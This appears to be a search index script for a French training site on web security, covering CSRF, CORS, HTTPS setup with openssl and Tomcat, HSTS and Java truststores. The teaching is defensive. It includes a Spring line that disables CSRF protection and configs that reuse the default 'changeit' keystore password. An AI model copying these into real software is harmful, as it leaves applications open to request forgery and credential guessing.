\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;${_csrf.parameterName}\u0026quot; value=\u0026quot;${_csrf.token}\u0026quot;/\u0026gt; \u0026lt;/form\u0026gt;   Protections #  Principe tout POST ne contenant pas ce paramètre se soldera par une 403 Potentiellement pas nécessaire sur tout le site Pour lever la protection en spring security:  http.csrf().ignoringAntMatchers(\u0026quot;/saml/**\u0026quot;); // l'ignorer sur certaines url http.csrf().disable(); // l'ignorer complètement   CSRF et applis \u0026ldquo;modernes\u0026rdquo; # Frontend JS + Backend Java\n Pas de formulaire côté serveur Des requêtes isolée, pas de cookie mais authentification par jeton Si je sers \u0026ldquo;presque\u0026rdquo; le même service javascript, si l\u0026rsquo;admin se connecte à mon service, je peux lui faire réaliser toutes les requêtes que je souhaite Protection = vérifier l\u0026rsquo;url où l\u0026rsquo;admin a récupéré le script   La protection CORS # Cross Over Resource Sharing\nScénario d\u0026rsquo;attaque :\n J\u0026rsquo;arrive sur un site pirate, qui déclenche un script récupérant une information sur le site cible, par exemple un site interne inaccessible d\u0026rsquo;Internet. L\u0026rsquo;information est ainsi chargée sur la page et la suite du script peut par exemple la renvoyer au pirate.   Contre-attaque :\n Seul le navigateur sait le site réel où il a récupéré le site Sur tout navigateur (récent), un script éxécuté par le client et appelant une ressource externe effectuera une vérification CORS =\u0026gt; La requête ne fonctionnera que si le site externe renvoit un entête Access-Control-Allow-Origin correspond au domaine du site source  Le site dit : voici l\u0026rsquo;url des sites qui peuvent m\u0026rsquo;appeler\n Les navigateurs envoient systématiquement et automatiquement l\u0026rsquo;entête Origin (à moins d\u0026rsquo;utiliser Netscape 8 ou IE 6)\nLe navigateur n\u0026rsquo;autorise pas la modification de cet entete par script\n La protection CORS #  Pour les requêtes GET et POST \u0026ldquo;simple\u0026rdquo;, supposées sans effets de bord (application/x-www-form-urlencoded,multipart/form-data,text/plain) : la requête est directement envoyée mais le résultat ne s\u0026rsquo;affiche qu\u0026rsquo;en cas de validation de CORS Pour les autres requêtes (avec effets de bord), le navigateur envoie préalablement une requête OPTION, vérifie CORS, et n\u0026rsquo;exécute la requête qu\u0026rsquo;en cas de validation !!! Les navigateurs vont maintenant plus loin et font la même vérification OPTION pour ces requêtes   La protection CORS #  C\u0026rsquo;est donc le serveur qui a la charge de lire l\u0026rsquo;entête Origin, de répondre ou non selon le contenu Le serveur DOIT ajouter l\u0026rsquo;entete Access-Control-Allow-Origin en cas de succès Par défaut un serveur ne va bien sûr rien renvoyer et sera donc impossible à appeler par script On peut envisager de renvoyer Access-Control-Allow-Origin: * si le site ne fournit que des données publiques non sensibles   La protection CORS # Domaine au sens CORS :\n Un domaine signifie dans ce contexte un triplet (protocole, nom de domaine, port). http://localhost:8080 n\u0026rsquo;est pas le même domaine que https://localhost:8443 et le domaine https://localhost (sous entendu port 443) est encore différent   Scénario CORS #  Un script lance une requête vers un autre domaine que celui où il est exécuté, typiquement via un XMLHttpRequest(). Le navigateur ajoute l\u0026rsquo;entete Origin à la requête Cet entête n\u0026rsquo;est pas modifiable par script  Origin: https://localhost:8443   Scénario CORS #  Le serveur recoit la requete et peut contrôler la présence de Origin s\u0026rsquo;il s\u0026rsquo;attend à de telles requêtes via script Le serveur possède un certain nombre de domaine autorisés à le contacter par script et potentiellement tous (*)   Scénario CORS #  Le serveur peut bloquer la requête si elle ne correspond pas à ses domaines autorisés Si le serveur choisit de répondre et qu\u0026rsquo;il est configuré pour, il ajoute un ou plusieurs entêtes Access-Control-Allow-Origin :  Access-Control-Allow-Origin: https://localhost:8443 Access-Control-Allow-Origin: http://localhost:8080   S\u0026rsquo;il accepte n\u0026rsquo;importe quel requête issue d\u0026rsquo;un script :  Access-Control-Allow-Origin: *   Scénario CORS #  Le navigateur lit la réponse du serveur Si elle ne contient pas d\u0026rsquo;entête Access-Control-Allow-Origin ou qu\u0026rsquo;aucun entête Access-Control-Allow-Origin ne correspond au domaine source, le navigateur ne retourne rien au script. Le script ne fait pas la difference entre un echec de connexion et une erreur cors   Gestion des erreurs :\n Pour debugger, la console du navigateur vous prévient que la réponse a été bloquée  Test : Test CORS KO\n La protection CORS #  Attention à l\u0026rsquo;autorisation globale (elle peut parfois être nécessaire cependant) : Access-Control-Allow-Origin: * L\u0026rsquo;idéal est de controler côté serveur l\u0026rsquo;entete \u0026ldquo;Origin\u0026rdquo; et de personnaliser l\u0026rsquo;entete \u0026ldquo;Access-Control-Allow-Origin\u0026rdquo; si on accepte Le détails complet de CORS ici : https://developer.mozilla.org/fr/docs/Web/HTTP/CORS   La protection CORS #  Il faut garder à l\u0026rsquo;esprit que CORS est une sécurité côté client pour l\u0026rsquo;empécher de faire n\u0026rsquo;importe quoi malgré lui : fournir à un script une information que le serveur n\u0026rsquo;a pas prévu d\u0026rsquo;être utilisée par un script.   Synthèse # Deux grands types de protection\n Vérifier les entrées utilisateurs ! (Sécurité active) Vérifier que l\u0026rsquo;utilisateur est bien conscient de ses actions :  Vérification d\u0026rsquo;état (Sécurité active) Dire au navigateur quelles opérations sont légitimes ou non (Sécurité déclarative)     S\u0026rsquo;initier aux failles applicatives #  OWASP  Documentation et notamment le OWASP top 10 WebGoat (découverte de failles sous forme de cours) Juice Store (challenges)   Natas Root Me  Par ailleurs le CERT-FR est un sytème de notification des failles applicatives. Il publie aussi régulièrement des articles de cybersécurité.\n Surveiller les dépendances obsolètes #  Dependabot (vérification existance d\u0026rsquo;une nouvelle version) Pour vérifier vulnérabilités connues : https://owasp.org/www-project-dependency-check/   \u0026ldquo;Le code des autres\u0026rdquo; #  Log4Shell Decembre 2021 https://fr.wikipedia.org/wiki/Log4Shell Voir projet exploit Exploiter avec https://canarytokens.org/generate  "}).add({id:7,href:"/docs/failles/sql/",title:"Injections de code (serveur)",description:"",content:""}).add({id:8,href:"/docs/failles/injection-client/",title:"Injections de code (client)",description:"Encore des injections...",content:""}).add({id:9,href:"/docs/https/fonctionnement/",title:"Fontionnement de https",description:"2 # Mise en place de HTTPS #  Les grands principes # HTTPS intervient dans :\n Intégrité Confidentialité Authentification   Les grands principes #  HTTP protocole purement applicatif \u0026ldquo;Web\u0026rdquo; : toutes données échangées sont en clair Protocole SSL ou TLS (le nom dépend de la version) : gestion d\u0026rsquo;un tunnel sécurisé Des protocoles purement fonctionnels (HTTP,FTP,SMTP,\u0026hellip;) peuvent se sécuriser simplement en s\u0026rsquo;échangeant dans un tunnel SSL HTTPS = HTTP + SSL   Proposer HTTPS #  Avoir un listener dédié au HTTPS (sur le port 443 dans une configuration standard) : le HTTPS est \u0026ldquo;implicite\u0026rdquo; Avoir une configuration HTTPS minimale, soit un couple clé privée/clé publique   Echange sécurisé #  Les deux parties, client et serveur, doivent se mettre d\u0026rsquo;accord sur une clé symétrique Il existe des méthode pour communiquer sur un réseau en clair une clé symétrique secrète, qui sera en fait partiellement généré par les deux parties (Algorithme de Diffie-Hellman) A quoi sert la clé asymétrique alors ?",content:"2 # Mise en place de HTTPS #  Les grands principes # HTTPS intervient dans :\n Intégrité Confidentialité Authentification   Les grands principes #  HTTP protocole purement applicatif \u0026ldquo;Web\u0026rdquo; : toutes données échangées sont en clair Protocole SSL ou TLS (le nom dépend de la version) : gestion d\u0026rsquo;un tunnel sécurisé Des protocoles purement fonctionnels (HTTP,FTP,SMTP,\u0026hellip;) peuvent se sécuriser simplement en s\u0026rsquo;échangeant dans un tunnel SSL HTTPS = HTTP + SSL   Proposer HTTPS #  Avoir un listener dédié au HTTPS (sur le port 443 dans une configuration standard) : le HTTPS est \u0026ldquo;implicite\u0026rdquo; Avoir une configuration HTTPS minimale, soit un couple clé privée/clé publique   Echange sécurisé #  Les deux parties, client et serveur, doivent se mettre d\u0026rsquo;accord sur une clé symétrique Il existe des méthode pour communiquer sur un réseau en clair une clé symétrique secrète, qui sera en fait partiellement généré par les deux parties (Algorithme de Diffie-Hellman) A quoi sert la clé asymétrique alors ? Problème du \u0026ldquo;Man in the middle\u0026rdquo;    Confidentialité #  \u0026ldquo;Information invisible par un tiers\u0026rdquo;\u0026hellip; Encore faut il maîtriser les deux parties Le client doit savoir qui il est en train de contacter Le serveur propose un certificat contenant principalement son nom : l\u0026rsquo;url que l\u0026rsquo;utilisateur a demandé sa clé publique la signature de ces informations par une autorité de confiance   Autorité de confiance ? #  C\u0026rsquo;est un organisme qui signe avec sa clé privée les informations du serveur On peut donc vérifier avec la clé publique de l\u0026rsquo;AC si informations et signature correspondent Pour récupérer la clé publique de l\u0026rsquo;Autorité de confiance, on consulte son\u0026hellip; Certificat ! \u0026hellip; Mais comment vérifier son certificat ? Le certificat d\u0026rsquo;une AC est autosignée, le navigateur est configuré pour accepter un certain nombre L\u0026rsquo;insee est une AC reconnue en interne uniquement Les applis Internet sont signées par une AC externe reconnue dans le monde entier (intégrée sur les navigateurs connus)   La poignée de main, ou handshaking #  Le client fait une demande de transaction sécurisée au serveur Le serveur renvoie son certificat, contenant la clé publique Le client valide le certificat Le client génère une clé secrète qu\u0026rsquo;il chiffre avec la clé publique. La clé secrète est envoyée au serveur Le serveur déchiffre la clé secrète Cette clé est utilisée pour chiffrer les prochains échanges entre le client et le serveur   La poignée de main, ou handshaking #  Comment faire en local ? #  Il n\u0026rsquo;est pas nécessaire d\u0026rsquo;avoir un certificat signé par une autorité de confiance Un certificat autosigné suffit : c\u0026rsquo;est un certificat \u0026ldquo;localhost\u0026rdquo; signé par \u0026ldquo;localhost\u0026rdquo;   Génération d\u0026rsquo;un certificat autosigné # # On génère une clé privée openssl genrsa 2048 \u0026gt; server.key # On génère la clé publique associé à la clé privée, et on prépare la demande de certificat openssl req -new -key server.key -out server.csr \u0026gt; Country Name (2 letter code) [AU]:FR \u0026gt; State or Province Name (full name) [Some-State]:France \u0026gt; Locality Name (eg, city) []:Paris \u0026gt; Organization Name (eg, company) [Internet Widgits Pty Ltd]:Insee \u0026gt; Organizational Unit Name (eg, section) []:CNIP \u0026gt; Common Name (e.g. server FQDN or YOUR name) []:localhost \u0026gt; Email Address []: \u0026gt; Please enter the following 'extra' attributes \u0026gt; to be sent with your certificate request \u0026gt; A challenge password []: \u0026gt; An optional company name []: #On fait signer la demande par l'AC qui ici est localhost lui-même openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt #Si on veut transformer en keystore openssl pkcs12 -export -in server.crt -inkey server.key -out server.p12 -passout pass:changeit   HTTPS en pratique #  L\u0026rsquo;application ne gère pas le HTTPS, c\u0026rsquo;est le serveur applicatif (tomcat) ou un équipement réseau supérieur qui en a la charge L\u0026rsquo;application peut imposer l\u0026rsquo;utilisation du HTTPS   HTTPS en pratique #  Dans tous les cas c\u0026rsquo;est le serveur applicatif (tomcat) qui a la charge de déterminer si la connexion entrante est sécurisée Cas direct : c\u0026rsquo;est tomcat qui gère lui même la connexion ssl Cas indirect : tomcat ne gère pas de connexion HTTPS mais il sait que la connexion initiale est en HTTPS (cas d\u0026rsquo;un reverse proxy) Si le connecteur gère la connexion ssl ou qu\u0026rsquo;il est dédié à recevoir des connexions sécurisées, on peut directement le spécifier sécurisé. Sinon, il va falloir définir un profil de requêtes sécurisées   HTTPS indirect en pratique : en production #  Architecture Load Balancer qui porte les certificats (et donc gère la connexion HTTPS) Le load balancer déchiffre et transmet une requête HTTP (en clair) au serveur applicatif portant l\u0026rsquo;application   HTTPS indirect en pratique : en production # Transfert de l\u0026rsquo;information HTTPS\n Pour savoir que la requête initiale est en HTTPS, le load balancer ajoute un entête \u0026ldquo;X-Forwarded-Proto: HTTPS\u0026rdquo;, et on configure Tomcat pour que la lecture de cet entête signifie sécurisé  \u0026lt;Valve className=\u0026quot;org.apache.catalina.connector.RemoteIpValve\u0026quot; protocolHeader=\u0026quot;X-Forwarded-Proto\u0026quot; /\u0026gt;  Une valve Tomcat est une classe exécutée (invoke()) à l\u0026rsquo;arrivée de chaque requête.\n HTTPS direct en pratique : sur localhost # Sur Tomcat\nDans server.xml :\n Ajout d\u0026rsquo;un connecteur SSL  \u0026lt;Connector port=\u0026quot;8443\u0026quot; protocol=\u0026quot;org.apache.coyote.http11.Http11NioProtocol\u0026quot; maxThreads=\u0026quot;150\u0026quot; SSLEnabled=\u0026quot;true\u0026quot; scheme=\u0026quot;https\u0026quot; secure=\u0026quot;true\u0026quot; clientAuth=\u0026quot;false\u0026quot; sslProtocol=\u0026quot;TLS\u0026quot; keystoreFile=\u0026quot;${catalina.home}/conf/ssl/server.p12\u0026quot; keystoreType=\u0026quot;pkcs12\u0026quot; keystorePass=\u0026quot;changeit\u0026quot; /\u0026gt;   HTTPS direct en pratique # Sur Tomcat\nDans server.xml\n Définition du port de redirection dans le cas d\u0026rsquo;un connecteur non sécurisé  \u0026lt;Connector connectionTimeout=\u0026quot;20000\u0026quot; port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; redirectPort=\u0026quot;8443\u0026quot;/\u0026gt;   Sur l\u0026rsquo;appli, pour indiquer qu\u0026rsquo;on impose du https # web.xml (Tomcat)\n\u0026lt;security-constraint\u0026gt; \u0026lt;display-name\u0026gt;tout-en-https\u0026lt;/display-name\u0026gt; \u0026lt;web-resource-collection\u0026gt; \u0026lt;web-resource-name\u0026gt;tout\u0026lt;/web-resource-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/web-resource-collection\u0026gt; \u0026lt;user-data-constraint\u0026gt; \u0026lt;transport-guarantee\u0026gt;CONFIDENTIAL\u0026lt;/transport-guarantee\u0026gt; \u0026lt;/user-data-constraint\u0026gt; \u0026lt;/security-constraint\u0026gt;   Sur l\u0026rsquo;appli, pour indiquer qu\u0026rsquo;on impose du https # Spring Security\n@Configuration @EnableWebSecurity public class SpringSecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.requiresChannel().antMatchers(\u0026quot;/**\u0026quot;).requiresSecure(); } }   TP #  Générer un keystore pour une configuration https de localhost Mettre en place https sur un serveur local Forcer le https sur l\u0026rsquo;application   Vraiment forcer le HTTPS #  Niveau applicatif pour controle éventuellement Niveau Frontal (Load Balancer) : écouter en http sur le port 80 mais uniquement pour rediriger vers https Déclaratif Indiquer au navigateur de ne plsu utiliser que HTTPS : en-tête HSTS  Strict-Transport-Security \u0026quot;max-age=31536000\u0026quot;   Le truststore #  Mon application doit se connecter à une autre application (web-service) Je souhaite que cet appel soit en https (au fond justifié que si la connexion entre les deux serveurs passent par Internet) Lors d\u0026rsquo;une connexion HTTPS, Java vérifie si le certificat distant est valide C\u0026rsquo;est ce que fait le navigateur quand on se connecte à un site Si le certificat n\u0026rsquo;est pas valide (expiré, non associé au domaine, non signé par une autorité de confiance), le navigateur me le signale et je choisit de prendre le risque ou non de me connecter au site. Dans l\u0026rsquo;appli, Java refusera systématiquement la connexion   Le truststore #  Date d\u0026rsquo;expiration, mauvais nom : je ne peux rien faire, il faut que le certificat soit cohérent Autosigné ? Je peux dire à Java que le signataire du certificat est valide, en d\u0026rsquo;autres termes, je lui définis une autorité de confiance (Il existe la possibilité de créer une classe faisant que Java ne fait plus aucun contrôle sur le certificat mais c\u0026rsquo;est mal) Il faut créer un truststore contenant l\u0026rsquo;ensemble des certificats à valider (= ce que l\u0026rsquo;on considère AC)   Le truststore #  Par défaut le trustore chargé est celui de la jvm éxécutant l\u0026rsquo;application (\u0026hellip;.\\mon-jdk\\lib\\security\\cacerts) Le mot de passe par défaut est changeit On peut vouloir un \u0026ldquo;Insee flavored cacert\u0026rdquo; : le cacerts disponible dans la distribution java plus la chaine de certification Insee (AC Racine + AC Subordonnée) Au cas où : certificats AC Insee   Le truststore #  Pour le changer on utilise des paramètres de la JVM :  javax.net.ssl.trustStrore javax.net.ssl.trustStorePassword javax.net.ssl.trustStoreType (par défaut jks)   On crée un nouveau truststore, en pratique on ajoute nos certificats au truststore par défaut   Le truststore #  Créer le truststore  keytool -import -trustcacerts -file server.crt -alias localhost -keystore cacertsperso  Si keytool inconnu : (à ajouter au path pour plus de simplicité)\n\u0026quot;path/to/mon-jdk/bin/keytool.exe\u0026quot; \u0026quot;$JAVA_HOME/bin/keytool.exe\u0026quot;  Crée le truststore si cacertsperso n\u0026rsquo;existe pas encore, ajoute le certificat aux existants s\u0026rsquo;il existe déjà\n Le truststore #  Le déclarer au démarrage :  Paramètres de démarrage    -Djavax.net.ssl.trustStore=\u0026quot;/path/to/cacerts.jks\u0026quot; -Djavax.net.ssl.trustStorePassword=changeit -Djavax.net.ssl.trustStoreType=JKS -Djavax.net.debug=all (UNIQUEMENT pour debugger en cas de problème, c'est TRES verbeux)   Dans le code :  System.setProperty(\u0026quot;javax.net.ssl.trustStore\u0026quot;, \u0026quot;/path/to/cacerts.jks\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStorePassword\u0026quot;, \u0026quot;changeit\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStoreType\u0026quot;, \u0026quot;JKS\u0026quot;);   TP #  Créer un truststore incluant le cacert Insee et le certificat généré précédemment Le faire prendre en compte dans l\u0026rsquo;application   Https sur les application javascript #  Fonctionnement proche : réalisé par le F5 en prod, par l\u0026rsquo;apache en dv/qf (mais il n\u0026rsquo;y a pas de tomcat) L\u0026rsquo;application s\u0026rsquo;éxécute chez le client, pour forcer le https, il faut donc raisonner côté client Si l\u0026rsquo;application JS veut s\u0026rsquo;assurer de passer en HTTPS, elle doit vérifier le window.location du client et éventuellement le rediriger.   Https sur les application javascript # if ( typeof window !== 'undefined' \u0026amp;\u0026amp; window.location \u0026amp;\u0026amp; window.location.protocol === 'http:' ) { window.location.href = window.location.href.replace( /^http(?!s)/, 'https' ); }   Https sur les application javascript : développement # Pour lancer une application \u0026ldquo;create-react-app\u0026rdquo; en https en local (par defaut http) :\n Au lieu de npm start Lancer set HTTPS=true\u0026amp;\u0026amp;npm start   Https sur les application javascript : cas du back-end mal signé # Un front-end JavaScript effectue des appels à son backend.\nDans la pratique, c\u0026rsquo;est le navigateur qui effectue ces requetes, et si le certificat du backend ne convient pas au navigateur, la requete va être rejetée.\n Solution 1 : Faire en sort que le backend ait un certificat signé par l\u0026rsquo;Insee Solution 2 : se connecter manuellement une fois au backend, accepter l\u0026rsquo;alerte de sécurité du navigateur  "}).add({id:10,href:"/docs/https/pratique/",title:"Mise en pratique de https",description:"Générer un certificat # Les étapes :\n Générer une clé privée Calculer la clé publique à partir de la clé privée Enrober la clé publique dans une demande de certificat Signer la demande de certificat (facultatif) Générer le bon format d\u0026rsquo;échange  Qui signe ?\n Une autorité payante Let\u0026rsquo;s encrypt Nous-même dans le cadre de l\u0026rsquo;exercice ! Certifcat dit autosigné, ici généré pour localhost, signé par localhost  # On génère une clé privée openssl genrsa 2048 \u0026gt; server.",content:"Générer un certificat # Les étapes :\n Générer une clé privée Calculer la clé publique à partir de la clé privée Enrober la clé publique dans une demande de certificat Signer la demande de certificat (facultatif) Générer le bon format d\u0026rsquo;échange  Qui signe ?\n Une autorité payante Let\u0026rsquo;s encrypt Nous-même dans le cadre de l\u0026rsquo;exercice ! Certifcat dit autosigné, ici généré pour localhost, signé par localhost  # On génère une clé privée openssl genrsa 2048 \u0026gt; server.key  # On génère la clé publique associé à la clé privée, et on prépare la demande de certificat openssl req -new -key server.key -out server.csr  \u0026gt; Country Name (2 letter code) [AU]:FR \u0026gt; State or Province Name (full name) [Some-State]:France \u0026gt; Locality Name (eg, city) []:Paris \u0026gt; Organization Name (eg, company) [Internet Widgits Pty Ltd]:Insee \u0026gt; Organizational Unit Name (eg, section) []:CNIP \u0026gt; Common Name (e.g. server FQDN or YOUR name) []:localhost \u0026gt; Email Address []: \u0026gt; Please enter the following 'extra' attributes \u0026gt; to be sent with your certificate request \u0026gt; A challenge password []: \u0026gt; An optional company name []:  # On fait signer la demande par l'AC qui ici est localhost lui-même openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt  # Si on veut transformer en keystore openssl pkcs12 -export -in server.crt -inkey server.key -out server.p12 -passout pass:changeit  Installation sur tomcat # Configuration des ports d\u0026rsquo;écoute : dans le server.xml :\nAjout d\u0026rsquo;un connecteur SSL # \u0026lt;Connector port=\u0026quot;8443\u0026quot; protocol=\u0026quot;org.apache.coyote.http11.Http11NioProtocol\u0026quot; maxThreads=\u0026quot;150\u0026quot; SSLEnabled=\u0026quot;true\u0026quot; scheme=\u0026quot;https\u0026quot; secure=\u0026quot;true\u0026quot; clientAuth=\u0026quot;false\u0026quot; sslProtocol=\u0026quot;TLS\u0026quot; keystoreFile=\u0026quot;${catalina.home}/conf/ssl/server.p12\u0026quot; keystoreType=\u0026quot;pkcs12\u0026quot; keystorePass=\u0026quot;changeit\u0026quot; /\u0026gt;  Configuration de la redirection du connecteur par défaut # On définie le port de redirection dans le cas ou une redirection https est imposée par l\u0026rsquo;application\nCe connecteur existe déjà par défaut, il faut uniquement changer le port de redirection si nécessaire\n\u0026lt;Connector connectionTimeout=\u0026quot;20000\u0026quot; port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; redirectPort=\u0026quot;8443\u0026quot;/\u0026gt;  Rendre le https obligatoire # web.xml (Tomcat)\n\u0026lt;security-constraint\u0026gt; \u0026lt;display-name\u0026gt;tout-en-https\u0026lt;/display-name\u0026gt; \u0026lt;web-resource-collection\u0026gt; \u0026lt;web-resource-name\u0026gt;tout\u0026lt;/web-resource-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/web-resource-collection\u0026gt; \u0026lt;user-data-constraint\u0026gt; \u0026lt;transport-guarantee\u0026gt;CONFIDENTIAL\u0026lt;/transport-guarantee\u0026gt; \u0026lt;/user-data-constraint\u0026gt; \u0026lt;/security-constraint\u0026gt;  Spring Security\n@Configuration @EnableWebSecurity public class MySecurityConfiguration { @Bean public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception { http.requiresChannel().anyRequest().requiresSecure(); } }  TP #  Générer un keystore pour une configuration https de localhost Mettre en place https sur un serveur local Forcer le https sur l\u0026rsquo;application   Vraiment forcer le HTTPS #  Niveau applicatif pour controle éventuellement Niveau Frontal (Load Balancer) : écouter en http sur le port 80 mais uniquement pour rediriger vers https Déclaratif Indiquer au navigateur de ne plsu utiliser que HTTPS : en-tête HSTS  Strict-Transport-Security \u0026quot;max-age=31536000\u0026quot;   Le truststore #  Mon application doit se connecter à une autre application (web-service) Je souhaite que cet appel soit en https (au fond justifié que si la connexion entre les deux serveurs passent par Internet) Lors d\u0026rsquo;une connexion HTTPS, Java vérifie si le certificat distant est valide C\u0026rsquo;est ce que fait le navigateur quand on se connecte à un site Si le certificat n\u0026rsquo;est pas valide (expiré, non associé au domaine, non signé par une autorité de confiance), le navigateur me le signale et je choisit de prendre le risque ou non de me connecter au site. Dans l\u0026rsquo;appli, Java refusera systématiquement la connexion   Le truststore #  Date d\u0026rsquo;expiration, mauvais nom : je ne peux rien faire, il faut que le certificat soit cohérent Autosigné ? Je peux dire à Java que le signataire du certificat est valide, en d\u0026rsquo;autres termes, je lui définis une autorité de confiance (Il existe la possibilité de créer une classe faisant que Java ne fait plus aucun contrôle sur le certificat mais c\u0026rsquo;est mal) Il faut créer un truststore contenant l\u0026rsquo;ensemble des certificats à valider (= ce que l\u0026rsquo;on considère AC)   Le truststore #  Par défaut le trustore chargé est celui de la jvm éxécutant l\u0026rsquo;application (\u0026hellip;.\\mon-jdk\\lib\\security\\cacerts) Le mot de passe par défaut est changeit On peut vouloir un \u0026ldquo;Insee flavored cacert\u0026rdquo; : le cacerts disponible dans la distribution java plus la chaine de certification Insee (AC Racine + AC Subordonnée) Au cas où : certificats AC Insee   Le truststore #  Pour le changer on utilise des paramètres de la JVM :  javax.net.ssl.trustStrore javax.net.ssl.trustStorePassword javax.net.ssl.trustStoreType (par défaut jks)   On crée un nouveau truststore, en pratique on ajoute nos certificats au truststore par défaut   Le truststore #  Créer le truststore  keytool -import -trustcacerts -file server.crt -alias localhost -keystore cacertsperso  Si keytool inconnu : (à ajouter au path pour plus de simplicité)\n\u0026quot;path/to/mon-jdk/bin/keytool.exe\u0026quot; \u0026quot;$JAVA_HOME/bin/keytool.exe\u0026quot;  Crée le truststore si cacertsperso n\u0026rsquo;existe pas encore, ajoute le certificat aux existants s\u0026rsquo;il existe déjà\n Le truststore #  Le déclarer au démarrage :  Paramètres de démarrage    -Djavax.net.ssl.trustStore=\u0026quot;/path/to/cacerts.jks\u0026quot; -Djavax.net.ssl.trustStorePassword=changeit -Djavax.net.ssl.trustStoreType=JKS -Djavax.net.debug=all (UNIQUEMENT pour debugger en cas de problème, c'est TRES verbeux)   Dans le code :  System.setProperty(\u0026quot;javax.net.ssl.trustStore\u0026quot;, \u0026quot;/path/to/cacerts.jks\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStorePassword\u0026quot;, \u0026quot;changeit\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStoreType\u0026quot;, \u0026quot;JKS\u0026quot;);   TP #  Créer un truststore incluant le cacert Insee et le certificat généré précédemment Le faire prendre en compte dans l\u0026rsquo;application   Https sur les application javascript #  Fonctionnement proche : réalisé par le F5 en prod, par l\u0026rsquo;apache en dv/qf (mais il n\u0026rsquo;y a pas de tomcat) L\u0026rsquo;application s\u0026rsquo;éxécute chez le client, pour forcer le https, il faut donc raisonner côté client Si l\u0026rsquo;application JS veut s\u0026rsquo;assurer de passer en HTTPS, elle doit vérifier le window.location du client et éventuellement le rediriger.   Https sur les application javascript # if ( typeof window !== 'undefined' \u0026amp;\u0026amp; window.location \u0026amp;\u0026amp; window.location.protocol === 'http:' ) { window.location.href = window.location.href.replace( /^http(?!s)/, 'https' ); }   Https sur les application javascript : développement # Pour lancer une application \u0026ldquo;create-react-app\u0026rdquo; en https en local (par defaut http) :\n Au lieu de npm start Lancer set HTTPS=true\u0026amp;\u0026amp;npm start   Https sur les application javascript : cas du back-end mal signé # Un front-end JavaScript effectue des appels à son backend.\nDans la pratique, c\u0026rsquo;est le navigateur qui effectue ces requetes, et si le certificat du backend ne convient pas au navigateur, la requete va être rejetée.\n Solution 1 : Faire en sort que le backend ait un certificat signé par l\u0026rsquo;Insee Solution 2 : se connecter manuellement une fois au backend, accepter l\u0026rsquo;alerte de sécurité du navigateur  "}).add({id:11,href:"/docs/",title:"Docs",description:"",content:""}),search.addEventListener("input",t,!0);function t(){const s=5;var n=this.value,o=e.search(n,{limit:s,enrich:!0});const t=new Map;for(const e of o.flatMap(e=>e.result)){if(t.has(e.doc.href))continue;t.set(e.doc.href,e.doc)}if(suggestions.innerHTML="",suggestions.classList.remove("d-none"),t.size===0&&n){const e=document.createElement("div");e.innerHTML=`No results for "<strong>${n}</strong>"`,e.classList.add("suggestion__no-results"),suggestions.appendChild(e);return}for(const[r,a]of t){const n=document.createElement("div");suggestions.appendChild(n);const e=document.createElement("a");e.href=r,n.appendChild(e);const o=document.createElement("span");o.textContent=a.title,o.classList.add("suggestion__title"),e.appendChild(o);const i=document.createElement("span");if(i.textContent=a.description,i.classList.add("suggestion__description"),e.appendChild(i),suggestions.appendChild(n),suggestions.childElementCount==s)break}}})()